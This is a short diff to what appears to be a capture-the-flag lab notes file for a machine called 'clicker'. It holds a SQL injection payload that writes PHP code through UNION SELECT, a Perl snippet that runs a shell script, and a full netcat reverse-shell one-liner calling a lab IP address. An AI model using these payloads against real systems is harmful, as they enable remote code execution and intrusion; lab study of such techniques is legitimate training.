@@ -37,3 +37,14 @@ $db_name="clicker";
 9999999999999999999 UNION SELECT '<?php phpinfo(); ?>', 2, 3 from players
 999999999999999999
 extension: php
+
+
+
+sub new {
+    system("sh script.sh --help");
+}
+
+
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.186 6667 >/tmp/f
+<img width="746" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/605b42fd-af46-492f-a817-365110c0ad75">
+
